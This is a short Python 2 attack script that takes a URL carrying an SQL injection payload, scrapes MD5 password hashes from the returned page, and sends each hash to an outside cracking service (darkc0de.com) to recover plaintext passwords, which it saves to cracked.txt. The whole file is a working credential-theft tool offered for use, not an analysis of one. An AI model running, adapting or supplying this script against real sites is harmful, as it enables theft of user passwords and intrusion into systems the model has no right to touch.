import sys,os, re, urllib2, socket,urllib
print "\n\t beenudel1986[at]gmail[dot]com"
host=raw_input("\nEnter the site with sql injection payload\n") 
if host[:7] != "http://": 
	host = "http://"+host 

print "[+] Testing..."
file=open('mds.txt' , "a")
try: 

		source = urllib2.urlopen(host, "80").read() 
		md5s = re.findall("[a-f0-9]"*32,source) 
		if len(md5s) >=1: 
			print "Found:" 
			for md5 in md5s: 
				print "\t-",md5
				file.write( md5 +'\n')
except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error): 
	pass 
except(KeyboardInterrupt): 
		pass 
file.close()
print "\n[-] cracking now."
hashes=open('mds.txt',"r").readlines()
for hash in hashes:

	url ="http://www.darkc0de.com/cgi-bin/md5lookup.py?hash="+hash
	site = urllib.urlopen(url).readlines()

	for line in site:
		if re.search("==", line):
			line=line.replace("<hr>","").replace('[!]',"").replace('<br><br></td></tr></table>',"")
			print "\n Password of hash " ,line
			file=open('cracked.txt',"a").write(hash +'\t' +line)
			
os.remove('mds.txt')


